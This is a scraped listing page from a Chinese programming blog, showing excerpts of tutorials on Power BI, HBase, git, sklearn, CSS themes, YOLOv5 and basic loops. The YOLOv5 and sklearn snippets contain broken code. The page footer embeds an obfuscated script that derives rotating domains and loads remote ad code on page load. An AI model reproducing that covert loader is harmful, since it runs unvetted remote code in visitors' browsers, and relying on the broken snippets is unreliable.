		continue：指的是跳出当前循环，即不执行continue后的语句，直接进入下次循环。
break：指的是跳出for本身，不再进行之后的循环，但可以执行for循环之外的语句。
return：指的是跳出for循环，且不执行for循环之外的语句，直接跳出当前函数，返回return后的值。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3c546fac685470e14ece2ff7b1ba433/" rel="bookmark">
			Power BI 筛选器函数---Index实例详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Index函数
语法：
INDEX ( &lt;检索行号&gt;, [&lt;关系&gt;], [&lt;OrderBy&gt;],[空白],[PartitionBy] )
含义：
对指定分区(PartitioinBy)中的行（关系表），按指定的列进行排序(OrderBy)后，根据（检索行号）定位单行。
参数：
参数
属性
描述
检索行号
偏移的行，可以是常量，也可以是返回值的表达式
关系表
可选
表表达式，要包含第3、第5个参数中用的列
OrderBy
可选
排序依据，如省略，第二个参数须指定
空白
可选
保留的参数位置，暂时无用
PartitionBy
可选
分区依据如果省略，视同只有一个分区
备注：
OrderBy、PartitionBy中出现的列，需要先在“关系表”中引用。
二、实例
已知表：日期表和表：销售记录（2020年~2022年），
表：日期表
表：销售记录（2020年~2022年）
生成月度销售金额报表
1、新建度量值，销售金额 = SUM('销售记录'[金额])
2、新建度量值，index(1) = CALCULATE('度量值表'[销售金额],INDEX(1,ALLSELECTED('日期表'[年],'日期表'[月]),ORDERBY('日期表'[月],ASC),,PARTITIONBY('日期表'[年])))
解析：以‘日期表’[年]作为分区，按‘日期表’[月]进行升序排列，然后定位第一行（1）
3、新建度量值，index(-1) = CALCULATE('度量值表'[销售金额],INDEX(-1,ALLSELECTED('日期表'[年],'日期表'[月]),ORDERBY('日期表'[月],ASC),,PARTITIONBY('日期表'[年])))
解析：以‘日期表’[年]作为分区，按‘日期表’[月]进行升序排列，然后定位最后一行（-1）
4、新建度量值，index(2) = CALCULATE('度量值表'[销售金额],INDEX(2,ALLSELECTED('日期表'[年],'日期表'[月]),ORDERBY('日期表'[月],ASC),,PARTITIONBY('日期表'[年])))
解析：以‘日期表’[年]作为分区，按‘日期表’[月]进行升序排列，然后定位第二行（2）
5、新建度量值，index(-2) = CALCULATE('度量值表'[销售金额],INDEX(-2,ALLSELECTED('日期表'[年],'日期表'[月]),ORDERBY('日期表'[月],ASC),,PARTITIONBY('日期表'[年])))
解析：以‘日期表’[年]作为分区，按‘日期表’[月]进行升序排列，然后定位倒数第二行（-2）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e42893475ff273de3822798ff9765426/" rel="bookmark">
			Hbase相关操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据模型的基本概念 HBase 中的数据被存储在表中，具有行和列，是一个多维的映射结构。本节将对与 HBase 数据模型相关的基本概念进行统一介绍。，
1. 表（Table)
HBase采用表来组织数据，表由许多行和列组成，列划分为多个列族。
2. 行（Row)
在表里面，每一行代表着一个数据对象。每一行都是由一个行键（Row Key）和一个或者多个列组成的。行键是行的唯一标识，行键并没有什么特定的数据类型，以二进制的字节来存储，按字母顺序排序。
因为表的行是按照行键顺序来进行存储的，所以行键的设计相当重要。设计行键的一个重要原则就是相关的行键要存储在接近的位置，例如，设计记录网站的表时，行键需要将域名反转（例如，org.apache.www、org.apache.mail、org.apache.jira），这样的设计能使与 apache 相关的域名在表中存储的位置非常接近。
访问表中的行只有 3 种方式：通过单个行键获取单行数据；通过一个行键的区间来访问给定区间的多行数据；全表扫描。
3. 列（Column）
列由列族（Column Family）和列限定符（Column Qualifier）联合标识，由“：”进行间隔，如 family:qualifiero
4. 列族（Column Family)
在定义 HBase 表的时候需要提前设置好列族，表中所有的列都需要组织在列族里面。列族一旦确定后，就不能轻易修改，因为它会影响到 HBase 真实的物理存储结构，但是列族中的列限定符及其对应的值可以动态增删。
表中的每一行都有相同的列族，但是不需要每一行的列族里都有一致的列限定符，所以说是一种稀疏的表结构，这样可以在一定程度上避免数据的冗余。
HBase 中的列族是一些列的集合。一个列族的所有列成员都有着相同的前缀，例如，courses:history 和 courses:math 都是列族 courses 的成员。“:”是列族的分隔符，用来区分前缀和列名。列族必须在表建立的时候声明，列随时可以新建。
5. 列限定符（Column Qualifier）
列族中的数据通过列限定符来进行映射。列限定符不需要事先定义，也不需要在不同行之间保持一致。列限定符没有特定的数据类型，以二进制字节来存储。
6. 单元（Cell）
行键、列族和列限定符一起标识一个单元，存储在单元里的数据称为单元数据，没有特定的数据类型，以二进制字节来存储。
7. 时间戳（Timestamp）
默认情况下，每一个单元中的数据插入时都会用时间戳来进行版本标识。
读取单元数据时，如果时间戳没有被指定，则默认返回最新的数据；写入新的单元数据时，如果没有设置时间戳，则默认使用当前时间。每一个列族的单元数据的版本数量都被 HBase 单独维护，默认情况下，HBase 保留 3 个版本数据。
1.进入shell
hbase(main):003:0&gt;hbase shell
2.查看所有表
hbase(main):003:0&gt; list
3.根据rowKey查询某个记录
hbase(main):003:0&gt;get '表名','rowKey'
4.常用过滤器
过滤方式是通过value过滤，匹配出value含7259的数据。
scan 'buss_surface', FILTER=&gt;"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e42893475ff273de3822798ff9765426/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b885810c109298a1794a89684b7bd42d/" rel="bookmark">
			LocalDate与Date相互转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.LocalDate转Date
LocalDate date = LocalDate.of(2006,07,26);
ZoneId zone = ZoneId.systemDefault();
Instant instant = date.atStartOfDay().atZone(zone).toInstant();
java.util.Date da = Date.from(instant);
2.Date转LocalDate
Instant instant =new Date().toInstant();
ZoneId zone = ZoneId.systemDefault();
LocalDateTime localDateTime = LocalDateTime.ofInstant(instant, zone);
LocalDate localDate= localDateTime.toLocalDate();
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0332413ed08acbaec3f2aceaab310957/" rel="bookmark">
			git如何同步本地仓库与远程仓库代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		fork仓库代码至本地后如何同步原仓库或其他成员仓库代码至本地
1、git remote查看远程仓库 目前只有origin是因为只是克隆了自己的仓库，还没有配置其他远程仓库，这是git给予克隆仓库的默认名
$ git remote origin 2、git remote add 别名 地址；手动添加需要同步的远程git仓库，同时指定一个简写 main是起的仓库别名
git remote add main http://........git 添加完成后再次查看远程仓库,可以看到添加成功
$ git remote main origin 3、git fetch main抓取远程仓库数据 $ git fetch main From http://......... * [new branch] dev -&gt; main/dev * [new branch] master -&gt; main/master 此时查看所有分支，可以看到刚刚抓取的远程仓库分支
$ git branch -a * dev master remotes/main/dev remotes/main/master remotes/origin/HEAD -&gt; origin/master remotes/origin/dev remotes/origin/master 4、合并远程仓库分支至本地（以main/master更新到本地的master为例） 本地切换至master
$ git checkout master Switched to branch 'master' Your branch is up to date with 'origin/master'.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0332413ed08acbaec3f2aceaab310957/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0669aabc8033735dbc1923303a20b89/" rel="bookmark">
			element中使用sortablejs进行行列拖拽及封装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、依赖 sortablejs 下载 npm install sortable.js --save 2、mounted中调用行列拖拽方法 mounted() { this.rowDrop() this.columnDrop() }, 行拖拽方法
rowDrop() { const tbody = document.querySelector('.el-table__body-wrapper tbody') Sortable.create(tbody, { animation: 150, ghostClass: 'blue-background-class', onEnd: ({ newIndex, oldIndex }) =&gt; { const currRow = this.tableData.splice(oldIndex, 1)[0] this.tableData.splice(newIndex, 0, currRow) } }) }, 列拖拽方法
columnDrop() { const wrapperTr = document.querySelector('.el-table__header-wrapper tr') this.sortable = Sortable.create(wrapperTr, { animation: 180, delay: 0, onEnd: (evt) =&gt; { if (evt.oldIndex === evt.newIndex) return const oldItem = this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0669aabc8033735dbc1923303a20b89/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a98fb0f74ff9595bf031ce052d423d8/" rel="bookmark">
			python-sklearn数据拆分与决策树的实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python-sklearn数据拆分与决策树的实现 前言一、数据拆分的sklearn实现1.拆分为训练集与测试集2.交叉验证法(1)留一交叉验证(2)验证集验证(3)k折交叉验证(4)s折交叉验证（s-fold） 3.sklearn交叉验证常用的命令(1)将拆分与评价合并执行(2)同时使用多个评价指标(3)使用交互验证后的模型进行预测 二、sklearn实现决策树1.代码实现2.绘制决策树 前言 hello大家好这里是小L😊，上一篇笔记简单复习了sklearn三板斧，学习sklearn数据预处理部分🙌
这次笔记内容:学习sklearn对数据拆分的实现，以及实现决策树模型并绘制决策树。数据集用sklearn内置数据及进行举例🌷。
小L希望可以在这里与大家一起进步！💪
一、数据拆分的sklearn实现 1.拆分为训练集与测试集 如果给定的样本数据充足，进行模型选择的一种简单方法是随机地将数据集切分成三部分，分别为训练集(training set)、验证集(validation set)和测试集(testset).训练集用来训练模型，验证集用于模型的选择，而测试集用于最终对学习方法的评估.在学习到的不同复杂度的模型中，选择对验证集有最小预测误差的模型.由于验证集有足够多的数据，用它对模型进行选择也是有效的.
首先讲解随机种子seed，方便对sklearn.model_selection.train_teat_split()中参数random_state的理解，random可以随机生成数字，但在前面输入设置好的代码则最后生成的随机数将不会改变。
#忽略警告信息（不显示警告信息） import warnings warnings.filterwarnings("ignore") #导入需要的库 import sklearn import random as r r.seed(666)#种子，相当于设置/输入密码，使下行代码保持不变 r.random() 🙌sklearn可对数据进行处理但是不能进行可视化
训练集:用于生成模型的
测试集:最终对模型方法进行评估
sklearn.model.selection.train_test_split(
arrays,
test_size=0.25：用于验证模型的样本比例，若为None所有样本参与训练，
train_size=None：用于训练模型的样本比例，None时自动基于test_size计算，
random_state=None：随机种子，
shuffle=True：是否在拆分前对样本进行随机排列（默认洗牌），
stratify=None：array-like or None是否按指定类别标签对数据做分层拆分（分层）
)
一般用参数arrays,test_size,random_stste
#导入波斯顿数据集 from sklearn.datasets import load_boston boston_df = load_boston() #导入训练集与测试集拆分模块 from sklearn.model_selection import train_test_split x_train,x_test,y_train,y_test = train_test_split(boston.data,boston.target,test_size=0.3,random_state=666) #按3:7拆,用4个变量进行接收数据，以免数据分割后被直接释放 len(x_train),len(x_test),len(y_train),len(y_test) boston数据集一共有506条数据，按3:7拆分数据集的输入与输出。
2.交叉验证法 但是，在许多实际应用中数据是不充足的，为了选择好的模型，可以采用交叉验证方法.交叉验证的基本想法是重复地使用数据:把给定的数据进行切分，将切分的数据集组合为训练集与测试集，在此基础上反复地进行训练、测试以及模型选择.
(1)留一交叉验证 保留一个数据点进行验证（每个数据点都会验证一次），其余数据训练模型。若有n个数据点，需重复交叉验证n次。
利用所有数据点，适用于数据量特别小时，受离群值影响，一般不用。
(2)验证集验证 保留一个样本数量集（设置比例），其余数据训练模型。只验证一次。结果具有偶然性。
(3)k折交叉验证 随机将数据集分成k份，每一份进行验证，其余数据进行训练，最终结果为k次记录的平均值。k越小越接近验证集法，k越大越接近留一法。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a98fb0f74ff9595bf031ce052d423d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/870c4cf3e067f498fae67321750ffc13/" rel="bookmark">
			几种实现主题切换的方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		几种实现主题切换的方式 1. 利用 prefers-color-scheme 特性 prefers-color-scheme是CSS 媒体特性【@media】用于检测用户是否有将操作系统的主题色设置为亮色【light】或者暗色【dark】。
当前prefers-color-scheme新特性支持各大主流电脑（window和IOS系统，Linux系统可以用第三方工具）端浏览器谷歌、火狐等，包括手机端的安卓和苹果，足以说明prefers-color-scheme属性已经稳定成熟，可以用于生产环境了。
prefers-color-scheme的使用也很简单，直接需要在全局css文件中添加以下代码
:root { color-scheme: light dark; } js可以通过window.matchMedia()来监听系统主题。
const scheme = window.matchMedia("(prefers-color-scheme: dark)"); if (scheme.matches) { console.log("深色模式"); } else { console.log("浅色模式"); } 除了自动跟随系统外，也可以手动切换。不过需要结合css变量，详情请看第四点。
优点：
简单 缺点：
不能自定义深浅主题样式 2. 切换 link 通过改变link的href。
优点
按需加载 缺点
动态加载样式，样式文件过大或者网络较慢的情况下会导致样式切换不流畅存在样式优先级问题后续新增样式或者修改比较麻烦 3. 引入所有主题样式，通过类名切换 类似第二种，不过为了解决反复加载样式文件问题采用提前将样式全部引入的方式，在需要切换主题的时候将指定的根元素类名更换，相当于直接做了样式覆盖，在该类名下的各个样式就统一地更换了
.light-scheme { background: #fff; } .dark-scheme { background: #1b1b1b; } function change(scheme) { const content = document.getElementsByTagName("body")[0]; content.setAttribute("class", scheme); } 优点：
不用重新加载样式文件，切换时不会卡顿 缺点：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/870c4cf3e067f498fae67321750ffc13/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68c2a1543eb4800f63fa468b06a337d4/" rel="bookmark">
			yolov5实时检测屏幕python代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下面是一份使用 YOLOv5 进行实时屏幕检测的 Python 代码示例：
``` import cv2 import numpy as np import torch from models import * from utils.datasets import * from utils.utils import *
class ObjectDetection: def init(self, model_def, model_weights, class_path, conf_thres=0.5, nms_thres=0.5, img_size=416): self.device = torch.device("cv2.CAP_PROP_FRAME_WIDTH" if torch.cuda.is_available() else "cpu")
# Set up model self.model =Darknet(model_def, img_size=img_size).to(self.device) if model_weights.endswith(".pt"): self.model.load_state_dict(torch.load(model_weights, map_location=self.device)["model"]) else: _ = load_darknet_weights(self.model, model_weights) self.model.eval() # Set in evaluation mode self.classes = load_classes(class_path) self.colors = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/68c2a1543eb4800f63fa468b06a337d4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a6071bf752f8cd66c4a24210424ea13/" rel="bookmark">
			第一篇文章
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面：
开始记录知识的第一步
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/14c13657591cb7f069e7814ff124a9fd/" rel="bookmark">
			在c&#43;&#43;中用for写出1-100的和
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用for写出1-100的和
代码如下：
#include &lt;iostream&gt; using namespace std; int main() { int sum = 0; //定义和 for (int i= 1; i &lt;=100; i ++) //循环100次 { sum = i + sum; //可以理解为0+1+2+3+.......+100 } cout &lt;&lt; "1-100的和为" &lt;&lt; sum &lt;&lt; endl; //输出最后的和 } 完成任务！！！
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/182/">«</a>
	<span class="pagination__item pagination__item--current">183/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/184/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>